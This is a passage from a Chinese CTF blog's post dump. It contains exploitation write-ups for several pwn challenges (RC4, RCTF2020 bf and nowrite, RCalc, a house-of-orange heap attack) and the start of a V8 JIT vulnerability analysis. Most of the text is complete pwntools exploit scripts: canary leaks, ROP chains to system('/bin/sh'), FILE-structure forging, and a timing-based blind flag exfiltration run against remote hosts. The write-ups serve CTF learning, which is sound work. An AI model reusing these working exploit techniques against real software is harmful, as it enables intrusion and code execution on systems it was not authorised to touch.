p64(0) + p64(0x21)  #color_ptr          #flags_ptr  payload += p64(0) + p64(heap_base+0xCD0)  #伪造flags堆  payload += p64(0) + p64(0x101)  payload = payload.ljust(0x40,&#x27;a&#x27;)  create(payload) #index2    payload = &#x27;b&#x27;*0x30  payload += p64(0) + p64(0x31)  payload = payload.ljust(0x50,&#x27;b&#x27;)  create(payload) #index3  #payload = &#x27;c&#x27;*0x10  #在后面继续伪造两个堆，绕过堆检查  payload = p64(0) + p64(0x21)  payload += &#x27;c&#x27;*0x10  payload += p64(0) + p64(0x31)  payload = payload.ljust(0x50,&#x27;c&#x27;)  create(payload) #2  #==================================================================  #这个堆，我们用来伪造vector的每一项的指针item*，通过控制item*指针，我们就对对需要的节点进行操作  #伪造item指针  #0  payload = p64(heap_base+0xCB0) #fake_chunk node  #1  payload += p64(heap_base+0xCB0) #fake_chunk node  #2  payload += p64(heap_base+0xC60) #aaaaaaaaaa node  payload += p64(heap_base+0xD10)   #bbbbbbbbb node  payload += p64(heap_base+0xD70)   #ccccccccc node  payload += p64(heap_base+0xD10)   #  payload += p64(heap_base+0xD70)     #  payload = payload.ljust(0x50,&#x27;c&#x27;)  create(payload) #5    delete(0)  #泄露main_arena+88地址  show()  sh.recvuntil(&#x27;]&#x27;)  sh.recvuntil(&#x27;] &#x27;)  main_arena_88 = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  _IO_list_all_addr = libc_base + _IO_list_all_s  libc_base = _IO_list_all_addr - _IO_list_all_s  system_addr = libc_base + system_s    print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)  print &#x27;system_addr=&#x27;,hex(system_addr)  #fastbin与我们伪造生成的unsorted bin重合！！  delete(3)  delete(2)  delete(1)  &#x27;&#x27;&#x27;&#x27;&#x27;#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串 fake_file = &#x27;/bin/sh\\x00&#x27; + p64(0x60) #size作为0x60，被放入small_bin，从而对应了chain指针 #unsorted bin attack，修改_IO_list_all为main_arena+88 fake_file += p64(0) + p64(_IO_list_all_addr-0x10) #_IO_write_base &lt; _IO_write_ptr fake_file += p64(0) + p64(1) fake_file = fake_file.ljust(0xC0,&#x27;\\x00&#x27;) fake_file += p64(0)*3 #vtable指针,同时，也作为fake_vtable的__dummy fake_file += p64(heap_base + 0x5E8) #__dummy2、__finish fake_file += p64(0)*2 #__overflow fake_file += p64(system_addr) &#x27;&#x27;&#x27;  #house of orange  #fake分成2部分，写入  #执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = &#x27;/bin/sh\\x00&#x27; + p64(0x60) #size作为0x60，被放入small_bin，从而对应了chain指针  #unsorted bin attack，修改_IO_list_all为main_arena+88  fake_file += p64(0) + p64(_IO_list_all_addr-0x10)  #_IO_write_base &lt; _IO_write_ptr  #fake_file += p64(0) + p64(1)  payload = &#x27;a&#x27;*0x20 + fake_file  create(payload.ljust(0x40,&#x27;\\x00&#x27;))  #第二部分  ##vtable指针,同时，也作为fake_vtable的__dummy  fake_file = p64(0) + p64(heap_base + 0xD98)  #__dummy2、__finish  fake_file += p64(0)*2  #__overflow  fake_file += p64(system_addr)  create(fake_file.ljust(0x50,&#x27;\\x00&#x27;))    #getshell  sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;p&#x27;)  sh.sendlineafter(&#x27;Input your flags (0-99):&#x27;,&#x27;f&#x27;*0x40)    sh.interactive()  \n","categories":["CTF"],"tags":["UAF","C++ vector","fastbin","未初始化漏洞","house of orange"]},{"title":"RC4","url":"/2020/02/06/RC4/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，存在**[栈溢出漏洞]{.mark}**\n\n\n由于开启了canary，因此，我们需要泄露canary，由于低位覆盖泄露出来的信息是加密的，解密可能比较麻烦，我们另选其他方法。[功能a里有一个不起眼的漏洞]{.mark}\n\n\n后面，输出了v7的内容\n\n\n然而，v6和v7仅仅在dword_6020CC &#x3D; 0时被初始化，[如果它们未初始化，其值会是什么？]{.mark}\n\n\n[如果v7未初始化，其值就是canary的值。]{.mark}\n因此，我们就用这种方法来泄露canary，然后就是正常的栈溢出操作\n#coding:utf8  from pwn import *  from LibcSearcher import *    sh = process(&#x27;./rc4&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,31957)  elf = ELF(&#x27;./rc4&#x27;)  puts_plt = elf.plt[&#x27;puts&#x27;]  puts_got = elf.got[&#x27;puts&#x27;]  main_addr = 0x4010BB  pop_rdi = 0x401283    def Generate_Key(c):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;a&#x27;)     sh.sendlineafter(&#x27;&gt;&#x27;,c)    def Do_Encode(content):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;b&#x27;)     sh.sendline(content)    def Exit():     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;d&#x27;)     sh.sendline()    Generate_Key(&#x27;b&#x27;)  Generate_Key(&#x27;d&#x27;)  data = sh.recvuntil(&#x27;\\n&#x27;)[16:]  length = len(data)  canary = &#x27;&#x27;  for i in range(length-1,-1,-2):     canary += data[i-2:i]  canary = int(canary,16)  print &#x27;canary=&#x27;,hex(canary)  payload = &#x27;a&#x27;*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)  Do_Encode(payload)    Exit()  sh.recvuntil(&#x27;&gt; &#x27;)  #泄露puts的地址  puts_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)  libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)    payload = &#x27;a&#x27;*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  Do_Encode(payload)  Exit()      sh.interactive()  \n\n通过本题，我们知道了**[程序里每个函数的canary都是同一个值，即泄露任何一个函数的canary，就能给其他函数使用]{.mark}**\n","categories":["CTF"],"tags":["栈溢出","未初始化漏洞"]},{"title":"RCTF2020_bf(string指针的利用)","url":"/2020/06/11/RCTF2020_bf/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，发现是一个brain fuck语言的解释器，其中在&gt;指令操作中，存在一个off by one，ptr指针可以指向string对象， \n然后，通过后面的read等操作，可以控制string内部第一个指针的低1字节\n\n\n而结尾的时候，会输出string指针指向的地方的内容\n\n\n因此，控制string指针，我们现在可以完成数据泄露。\nString对象内部有这4个成员，我们能够通过off by one控制buf。该指针指向字符串的数据开始处。\nstruct &#123;   char *buf;   size_t size;   size_t capacity;   char tmp_buf[8];&#125;;\n\n程序开头，使用operator+来将字符连接到string中，operator+主要就是把字符串拼接到buf+size指向的位置处。而开头的时候，使用了clear(&amp;string,0)，该操作将把size赋值为0，由此，我们可以利用此来实现string指针地址附近任意读写。\n\n\n通过阅读源码再加以调试，[string对象初始的时候，其buf指针一开始指向string对象的tmp_buf处]{.mark}，当长度超过8字节时，会使用malloc分配堆内存来存储字符串。这就是重点了。\n\n\n这个string对象是放在栈上的，所以只要其字符串不超过8字节，那么buf指向的就是栈地址，通过低1字节控制buf指向，就能实现对栈上数据进行读写。当我们控制栈以后，修改capacity，这样，就可以写更多的数据，而不会触发string调用malloc重新申请内存。我们劫持返回地址，做ROP即可。我们可以把rop布置在前面的box里面。当我们结束修改以后，最后我们需要把buf指针改回原来的位置，不然string的析构函数执行时会崩溃。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)offset = libc.symbols[&#x27;__libc_start_main&#x27;] + 0xE7open_s = libc.sym[&#x27;open&#x27;]read_s = libc.sym[&#x27;read&#x27;]write_s = libc.sym[&#x27;write&#x27;]while True:   try:      global sh      #sh = process(&#x27;./bf&#x27;)      sh = remote(&#x27;124.156.135.103&#x27;,6002)      payload = &#x27;+[&gt;+],&#x27;      sh.sendlineafter(&#x27;enter your code:&#x27;,payload)      sh.sendafter(&#x27;running....&#x27;,p8(0xB0))      sh.recvuntil(&#x27;done! your code: &#x27;)      x = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))      if x &gt;&gt; 40 != 0x7F:         raise Exception(&#x27;leak error&#x27;)      stack_addr = x      print &#x27;stack_addr=&#x27;,hex(x)      sh.sendafter(&#x27;want to continue?&#x27;,&#x27;y&#x27;)      sh.sendlineafter(&#x27;enter your code:&#x27;,payload)      sh.sendafter(&#x27;running....&#x27;,p8(0xC8))      sh.recvuntil(&#x27;done! your code: &#x27;)      x = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))      if x &gt;&gt; 40 != 0x7F:         raise Exception(&#x27;leak error&#x27;)      libc_base = x - offset      pop_rdi = libc_base + 0x000000000002155f      pop_rsi = libc_base + 0x0000000000023e6a      pop_rdx = libc_base + 0x0000000000001b96      pop_rsp = libc_base + 0x0000000000003960      open_addr = libc_base + open_s      read_addr = libc_base + read_s      write_addr = libc_base + write_s      print &#x27;libc_base=&#x27;,hex(libc_base)      print &#x27;open_addr=&#x27;,hex(open_addr)      print &#x27;read_addr=&#x27;,hex(read_addr)      print &#x27;write_addr=&#x27;,hex(write_addr)      sh.sendafter(&#x27;want to continue?&#x27;,&#x27;y&#x27;)      rop_addr = stack_addr - 0x1C0      flag_addr = rop_addr + 0x98      sh.sendlineafter(&#x27;enter your code:&#x27;,payload)      sh.sendafter(&#x27;running....&#x27;,p8(0xC8-8))      sh.sendafter(&#x27;want to continue?&#x27;,&#x27;y&#x27;)      payload = &#x27;+[,&gt;+],a&#x27; + p64(pop_rsp) + p64(rop_addr)      sh.sendlineafter(&#x27;enter your code:&#x27;,payload)      sh.recvuntil(&#x27;running....&#x27;)      rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)      rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)      rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(write_addr)      rop += &#x27;./flag\\x00&#x27;      for i in range(0x400 - len(rop) - 1):         sh.send(&#x27;a&#x27;)      for x in rop:         sh.send(x)      sh.send(&#x27;a&#x27;)      #复原      sh.send(p8(0x90))      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;","categories":["CTF"],"tags":["ROP","解释器/简易虚拟机","C++ string","off by one"]},{"title":"RCTF2020_nowrite(libc_start_main的妙用+盲注)","url":"/2020/06/11/RCTF2020_nowrite/","content":"首先，检查一下程序的保护机制\n\n\n检测一下沙箱，发现仅能进行open、read、exit操作，write操作都不行。\n\n\n然后，我们用IDA分析一下，是一个及其简短的栈溢出程序\n\n\n程序中没有输出，并且write也禁用了，也没有open函数，execve也禁用了，FULL RELRO也不能进行ret2dl，那么本题只能进行盲注，我们还需要构造出一个open系统调用。但是几乎没有可用的地方可以给我们构造。\n找到一条有用的gadgets，如果在bss段上有一个libc某指针，通过这个gadget可以让其指向syscall，这样我们就可以构造open系统调用了。\n\n\n但是bss段上没有这样的指针，如果有stdout，那么我们可以利用，但是这里没有。由此，想到了libc_start_main。\n\n\n我们可以先将栈迁移到bss段上，然后调用libc_start_main重启某函数，这样，在bss上就会留下很多libc指针，但是我们不能重启main函数了，因为里面有prctl函数，而prctl调用被禁了。由此，我们可以重启read_n函数，继续输出，劫持自己的返回地址，然后就又可以做rop了。\n当在bss段上留下libc指针后，我们就通过gadget将其修改为syscall的地址，然后构造open、read将flag读取到内存当中。\n接下来，就是盲注了，在csu上，有一个cmp指令非常有用，我们可以令rbp的低1自己保存着flag对应偏移的1字节，rbp其余字节全为0，然后，我们从rop里传入rbx的值为我们猜测的字符，这样cmp比较，成功后会向下执行pop，我们在后面再布置合适的rop，将栈转移到前面进行重复的cmp，相当于是一个死循环；如果比较失败，则jnz会跳到前面，然后执行call的时候，会崩溃。\n\n\n如何来让rbp仅保存flag的1字节是重点。\n\n\n比如，我们要盲注第3个字符，我们读取3个符，将它存储到rbp-0x2的位置，这样，第3个字符就落到了rbp的位置，同理，我们盲注第n个字符时，从文件中读取n个字节，将它存储到rbp-n+1的位置，而rbp始终是这个地址。如何将值保存到rbp里呢，我们使用栈迁移，这样在leave;ret的时候，pop rbp就将数据存储到了rbp里，接下来就会执行后面的rop，因此，我们在bss段上任意找一个地方，保证其8字节为0，以后，我们就将rbp固定在这，然后事先在这后面布置好rop，接下来flag读取存储到这里后，栈迁移过来进行cmp等操作。\n#coding:utf8from pwn import *elf = ELF(&#x27;./no_write&#x27;)read_n = 0x00000000004006BFread_got = elf.got[&#x27;read&#x27;]main_addr = 0x00000000004006E8ret = 0x000000000040070Cpop_rbp = 0x0000000000400588#pop rdi ; retpop_rdi = 0x0000000000400773#pop rsi ; pop r15 ; retpop_rsi = 0x0000000000400771#pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; retpop = 0x000000000040076b#pop rbx;pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; retcsu_pop = 0x000000000040076Acmp_rbx_rbp = 0x0000000000400761#leave_retleave_ret = 0x000000000040067c&#x27;&#x27;&#x27;.text:00000000004005B0                 mov     rdx, r15.text:00000000004005B3                 mov     rsi, r14.text:00000000004005B6                 mov     edi, r13d.text:00000000004005B9                 call    qword ptr [r12+rbx*8].text:00000000004005BD                 add     rbx, 1.text:00000000004005C1                 cmp     rbp, rbx.text:00000000004005C4                 jnz     short loc_4005B0&#x27;&#x27;&#x27;csu_call = 0x0000000000400750bss_addr = 0x0000000000601080call_libc_start_main = 0x0000000000400544#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; retadd_dp_rbp = 0x00000000004005e8new_stack = bss_addr + 0x600def blind(index,guess_char):   #第一步做栈迁移，迁移到bss   payload = &#x27;a&#x27;*0x18 + p64(pop_rdi) + p64(new_stack+0x8) + p64(pop_rsi) + p64(0x00000000006015D0) + p64(0) + p64(read_n)   payload += p64(pop_rbp) + p64(new_stack) + p64(leave_ret)   #raw_input()   sleep(0.2)   sh.send(payload)   sleep(0.2)   #raw_input()   bss_start = 0x0000000000601078   #接下来，我们在bss段上，调用read，然后劫持read自己的返回栈   payload = p64(pop_rdi) + p64(read_n + 0x1C) + p64(call_libc_start_main)   sh.send(payload)   #raw_input()   sleep(0.2)   #现在，在bss上面，保留了libc指针，通过rop，我们将其值修改为syscall的地址   target_syscall = 0x00000000006015C0   #flag文件名字符串的地址   flag_addr = 0x0000000000601708   rop = p64(csu_pop)   rop += p64(0x10000000000000000-0x2) #rbx = -2   rop += p64(target_syscall + 0x3D) #rbp   rop += p64(0) #r12   rop += p64(0) #r13   rop += p64(0) #r14   rop += p64(0) #r15   rop += p64(ret) * 11   rop += p64(add_dp_rbp)   #target_syscall后续的rop，是靠当前这个read来输入的   rop += p64(pop_rdi) + p64(target_syscall + 0x8) + p64(pop_rsi) + p64(0x1000) + p64(0) + p64(read_n)   #read_n(bss,2)使得rax为2   rop += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0x2) + p64(0) + p64(read_n)   rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0)*2   #栈迁移到那个target_syscall前方，这样我们就可以执行syscall了   rop += p64(pop_rbp) + p64(target_syscall - 0x8) + p64(leave_ret)   rop += &#x27;./flag\\x00&#x27;   sh.send(rop)   sleep(0.2)   #raw_input()   rop_addr = 0x00000000006015C8   flag_addr = rop_addr + 0x200   #此次用于输入rop2   rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0x1000) + p64(0) + p64(read_n)   #盲注逻辑   rop += p64(csu_pop)   rop += p64(0) + p64(1)   rop += p64(read_got)   #通过将存储flag的地址位置上移动，达到读取下一个字符的作用   rop += p64(3) + p64(flag_addr-index) + p64(0x1+index)   rop += p64(csu_call)   rop += p64(0)   #rbx = guess_char   rop += p64(ord(guess_char))   #rbp   rop += p64(flag_addr)   rop += p64(0)*4   #栈迁移到flag里面，使得rbp保存了flag的1字节数据   rop += p64(leave_ret)   sleep(0.2)   sh.send(rop)   #raw_input()   #使得rax为2   sh.sendline(&#x27;a&#x27;)   #rop2   #如果盲注成功，栈重新转移回去，一直比较，使得程序一直处于一个循环，达到延时的目的，不成功则直接崩溃   rop2 = &#x27;\\x00&#x27;*8 + p64(cmp_rbx_rbp) + p64(0)   #rbx 重新赋值为guess_char   rop2 += p64(ord(guess_char))   #rbp重新转到flag_addr处   rop2 += p64(flag_addr)   rop2 += p64(0)*4   #栈重新回去   rop2 += p64(leave_ret)   #raw_input()   sleep(0.2)   sh.sendline(rop2)#blind(1,&#x27;C&#x27;)#flag里面可能出现的字符possible_char = []possible_char.append(&#x27;_&#x27;)#字符的顺序可以影响效率，让频率最高的字符放前面for x in range(0,10):   possible_char.append(str(x))for x in range(ord(&#x27;A&#x27;),ord(&#x27;Z&#x27;)+1):   possible_char.append(chr(x))for x in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1):   possible_char.append(chr(x))possible_char.append(&#x27;&#123;&#x27;)possible_char.append(&#x27;&#125;&#x27;)possible_char.append(&#x27;\\x00&#x27;)OK = False#flag = &#x27;RCTF&#123;C0mpare_f1ag_0ne_bY_oNe&#125;&#x27;flag = &#x27;&#x27;index = 0while not OK:   print &#x27;guess (&#x27;,index,&#x27;) char&#x27;   length = len(flag)   for guess_char in possible_char:      global sh      #sh = process(&#x27;./no_write&#x27;)      sh = remote(&#x27;129.211.134.166&#x27;,6000)      blind(index,guess_char)      start = time.time()      sh.can_recv_raw(timeout = 3)      end = time.time()      sh.close()      if end - start &gt; 3:         if guess_char == &#x27;\\x00&#x27;:            OK = True         flag += guess_char         print &#x27;success guess char at(&#x27;,index,&#x27;)&#x27;         index+=1         break;   print &#x27;flag=&#x27;,flag   if length == len(flag):      OK = True      print &#x27;ojbk!&#x27;","categories":["CTF"],"tags":["栈溢出","ROP","libc_start_main的妙用","盲注"]},{"title":"RCalc","url":"/2019/11/19/RCalc/","content":"首先，检查一下程序的保护机制,还不错，只开了NX\n\n\n然后，我们用IDA分析\n看到这，感觉像是堆的题，应该会很复杂。然而，我们再看看其他地方，发现这个函数只是在初始化时调用的，也不太可能会被利用，而且程序全程没有调用free函数\n\n\n然后，我们瞧瞧其他函数，看到这里感觉好复杂，然而，它只是一个用来生成随机数的函数罢了\n\n\n然后，我们继续看其他函数\n\n\n这个样子，好像是canary的保护机制啊。这不就是**[他自己写了一个类似于canary的东西吗]{.mark}**\n[原来那么一大堆，只是为了完成堆溢出检测罢了]{.mark}\nscanf这里有一个栈溢出\n\n\n这里是保存计算结果到堆里\n\n\n其中，它没有检查堆溢出，里面的数据可以无限制的添加\n\n\n取canary的操作\n\n\n我们可以看出，他自己写的canary机制是把值存到一个堆里，并且遵循栈的性质\ntypedef struct &#123;      int top;      int *data;  &#125; Canarys;  \n\n再重新看看创建堆的操作,经过分析，第一个0x100堆用来存放计算结果，第二个0x320堆用来存放n个canary的值。由于创建的顺序是0x100的那个用来保存计算结果的堆先创建，并且之前没有free操作，那么0x100堆的后面就是0x320堆，[我们可以从0x100堆里溢出到0x320堆里，覆盖canary的值为我们自己设置的值，这样就绕过了这个检测机制，然后就是正常的ROP操作了。]{.mark}\n\n\n调试看看\n\n\n\n\n所以，需要保存(0Xceb160-0xceb050) &#x2F; 8 &#x3D; 0x22个整数后，就可以溢出了\ndef setCanary(canary):     for i in range(0x22):        sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)        sh.sendlineafter(&#x27;input 2 integer:&#x27;,&#x27;0&#x27;)        sh.sendline(&#x27;1&#x27;)        sh.sendlineafter(&#x27;Save the result?&#x27;,&#x27;yes&#x27;)     sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;input 2 integer:&#x27;,&#x27;0&#x27;)     sh.sendline(str(canary))     sh.sendlineafter(&#x27;Save the result?&#x27;,&#x27;yes&#x27;)  \n\n本题，由于是**[使用scanf来输入payload中的，因此，我们的payload中不能出现0x20(空格)数据]{.mark}**，也就是地址里，不能有0x20数据，因此这些got表都用不了，放入payload的话，scanf遇到0x20就会停止输入，从而造成payload输入不完整。\n\n\n但是，上面的那个__libc_start_main或__gmon_start__倒是可以用来泄露，因为他们的got表地址没有0x20\n\n\nPuts也不能用了，因为有0x20\n我们用printf\n\n\n那么，我们先泄露__libc_start_main加载地址，计算出libc地址\npayload = &#x27;a&#x27;*0x108 + p64(mycanary) + &#x27;a&#x27;*0x8 + p64(pop_rdi) + p64(__libc_start_main_got) + p64(printf_plt) + p64(main_addr)  sh.sendlineafter(&#x27;Input your name pls: &#x27;,payload)  #现在我们要通过堆溢出，把canary的值改成我们的mycanary  setCanary(mycanary)  sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;5&#x27;)  \n\n这里有个奇怪的问题，当mycanary为非0时，printf会报错\n\n\n所以我们的mycanary统一就都为0吧\n于是，我们最终的exp脚本\n#coding:utf8  from pwn import *    context.log_level = &#x27;debug&#x27;    #sh = remote(&#x27;111.198.29.45&#x27;,49895)  sh = process(&#x27;./RCalc&#x27;)  elf = ELF(&#x27;./RCalc&#x27;)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  printf_plt = elf.plt[&#x27;printf&#x27;]  __libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]  #pop_rdi用于64位函数传参  pop_rdi = 0x401123  main_addr = 0x401036  #我们自己设置canary，不知道为什么，如果非0,printf会报段错误  mycanary = 0    print hex(__libc_start_main_got)    def setCanary(canary):     for i in range(0x22):        sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)        sh.sendlineafter(&#x27;input 2 integer:&#x27;,&#x27;0&#x27;)        sh.sendline(&#x27;1&#x27;)        sh.sendlineafter(&#x27;Save the result?&#x27;,&#x27;yes&#x27;)     sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;input 2 integer:&#x27;,&#x27;0&#x27;)     sh.sendline(str(canary))     sh.sendlineafter(&#x27;Save the result?&#x27;,&#x27;yes&#x27;)    #注意，我们的payload中不能有0x20数据，因为这是空格，会导致数据截断  #我们先写ROP到栈里  payload = &#x27;a&#x27;*0x108 + p64(mycanary) + &#x27;a&#x27;*0x8 + p64(pop_rdi) + p64(__libc_start_main_got) + p64(printf_plt) + p64(main_addr)  sh.sendlineafter(&#x27;Input your name pls: &#x27;,payload)  #现在我们要通过堆溢出，把canary的值改成我们的mycanary  setCanary(mycanary)  sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;5&#x27;)    __libc_start_main_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  #获取libc基地址  libc_base = __libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]  system_addr = libc_base + libc.sym[&#x27;system&#x27;]  binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()  print &#x27;libc_base=&#x27;,hex(libc_base)    payload = &#x27;a&#x27;*0x108 + p64(mycanary) + &#x27;a&#x27;*0x8 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  sh.sendlineafter(&#x27;Input your name pls: &#x27;,payload)  setCanary(mycanary)  sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;5&#x27;)      sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ROP","堆溢出"]},{"title":"从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化","url":"/2020/12/10/RealWorldCTF-Quals-2019-accessible/","content":"文章首发于安全KER https://www.anquanke.com/post/id/224765\n0x00前言从一题学习v8引擎对property access的相关JIT优化\n0x01 前置知识简介在js中，字典类型的键称为属性(property)，如下，dict是一个对象，其中a是它的一个属性\nvar dict = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;\n当你要访问a时，首先是从这个对象里面查找键的内容a，找到后从中取出其对应的值。\n优化空间优化假如有多个具有相同键的对象，其排列顺序也一样，那么可以不必为每一个对象都存储这些键的值，单独存储一份键的模板，我们称之为Shape，比如上述的dict其键模板为\nab\n然后每个对象只需要保存一份键模板的指针即可，这样就节省了大量的空间。运行如下的代码，并打印JIT代码\nvar obj = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;function  opt(o)&#123;    o.b = 1.1;    o.a = 2.2;    return o.b;&#125;for(var i = 0; i &lt; 0x20000; i++)&#123;    opt(obj);&#125;\n发现生成的JIT代码如下(部分)\n0x38af000851a2    c2  48b88d2c2d08af380000 REX.W movq rax,0x38af082d2c8d    ;; object: 0x38af082d2c8d &lt;HeapNumber 1.1&gt;0x38af000851ac    cc  48bf158c1408af380000 REX.W movq rdi,0x38af08148c15    ;; object: 0x38af08148c15 &lt;Object map = 0x38af0830745d&gt;0x38af000851b6    d6  89470f         movl [rdi+0xf],rax0x38af000851b9    d9  49c7c00000fcff REX.W movq r8,0xfffc00000x38af000851c0    e0  4c23c7         REX.W andq r8,rdi0x38af000851c3    e3  41f6400804     testb [r8+0x8],0x40x38af000851c8    e8  0f8533020000   jnz 0x38af00085401  &lt;+0x321&gt;0x38af000851ce    ee  49b87d2c2d08af380000 REX.W movq r8,0x38af082d2c7d    ;; object: 0x38af082d2c7d &lt;HeapNumber 2.2&gt;0x38af000851d8    f8  4489470b       movl [rdi+0xb],r80x38af000851dc    fc  49c7c10000fcff REX.W movq r9,0xfffc00000x38af000851e3   103  4c23cf         REX.W andq r9,rdi0x38af000851e6   106  41f6410804     testb [r9+0x8],0x40x38af000851eb   10b  0f85cc010000   jnz 0x38af000853bd  &lt;+0x2dd&gt;0x38af000851f1   111  4c8bc9         REX.W movq r9,rcx\n可以发现，这里直接用数组下标寻址的方式进行了属性的赋值和访问\nmovl [rdi+0xf],raxmovl [rdi+0xb],r8\nInline Caches (ICs)如果要多次访问字典类型的数据，那么查找键的时间耗费是比较大的，因此v8引擎使用了一种叫Inline Caches (ICs)的机制来缓解这种查找的时间耗费。假如有如下函数\nfunction (obj) &#123;\treturn obj.a;&#125;\n如果要调用该函数对同一个对象进行多次访问，那么可以将该函数里的访问过程进行优化，即不必再从查找键开始，将该键对应的数据缓存下来，这样下次访问时先校验，然后直接从缓存中加载。如下，我们对同一个对象进行了多次访问\nvar obj = &#123;a:&quot;haivk&quot;,b:&quot;hai&quot;&#125;;function  opt(o)&#123;    return o.b;&#125;for(var i = 0; i &lt; 0x20000; i++)&#123;    opt(obj);&#125;print(opt(obj));\n对应的JIT代码如下（部分）\n0x12f100084fd7   117  b81e000000     movl rax,0x1e0x12f100084fdc   11c  48bee1302c08f1120000 REX.W movq rsi,0x12f1082c30e1    ;; object: 0x12f1082c30e1 &lt;NativeContext[243]&gt;0x12f100084fe6   126  49ba00b91ce0007f0000 REX.W movq r10,0x7f00e01cb900  (LoadGlobalICTrampoline)    ;; off heap target0x12f100084ff0   130  41ffd2         call r100x12f100084ff3   133  49c7c503000000 REX.W movq r13,0x30x12f100084ffa   13a  e841f00b00     call 0x12f100144040     ;; deopt-soft deoptimization bailout\n可以看到最后一个print调用时，直接使用LoadGlobalICTrampoline函数从缓存中加载了数据，而不必再从对象中查找。与LoadGlobalICTrampoline对应函数是StoreGlobalICTrampoline，可以将数据保存到缓存中。\n0x02 漏洞分析patch点分析patch文件如下\ndiff --git a/src/compiler/access-info.cc b/src/compiler/access-info.ccindex 0744138..1df06df 100644--- a/src/compiler/access-info.cc+++ b/src/compiler/access-info.cc@@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(       // The field type was cleared by the GC, so we don&#x27;t know anything       // about the contents now.     &#125;+#if 0     unrecorded_dependencies.push_back(         dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref,                                                                   descriptor));+#endif     if (descriptors_field_type-&gt;IsClass()) &#123;       // Remember the field map, and try to infer a useful type.       Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate());@@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(   &#125;   // TODO(turbofan): We may want to do this only depending on the use   // of the access info.+#if 0   unrecorded_dependencies.push_back(       dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));+#endif    PropertyConstness constness;   if (details.IsReadOnly() &amp;&amp; !details.IsConfigurable()) &#123;     constness = PropertyConstness::kConst;   &#125; else &#123;     map_ref.SerializeOwnDescriptor(descriptor);-    constness = dependencies()-&gt;DependOnFieldConstness(map_ref, descriptor);+    constness = PropertyConstness::kConst;   &#125;   Handle&lt;Map&gt; field_owner_map(map-&gt;FindFieldOwner(isolate(), descriptor),                               isolate());\n可以看到，patch文件通过#if和#endif将两处unrecorded_dependencies.push_back(dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor));给注释掉了，并且constness = PropertyConstness::kConst;将constness设为了PropertyConstness::kConst从源码中的注释\n\n&#x2F;&#x2F; Store is not safe if the field type was 